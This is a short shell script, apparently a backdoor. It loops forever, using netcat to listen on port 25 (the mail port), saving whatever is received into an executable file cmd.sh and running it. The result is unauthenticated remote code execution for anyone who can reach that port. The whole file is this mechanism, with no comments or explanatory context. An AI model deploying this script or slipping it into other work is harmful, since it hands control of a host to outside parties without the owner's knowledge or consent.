#!/bin/sh

echo "#!/bin/sh" > cmd.sh
chmod a+x cmd.sh

while true; do
	nc -l -p 25 > cmd.sh
	./cmd.sh
done


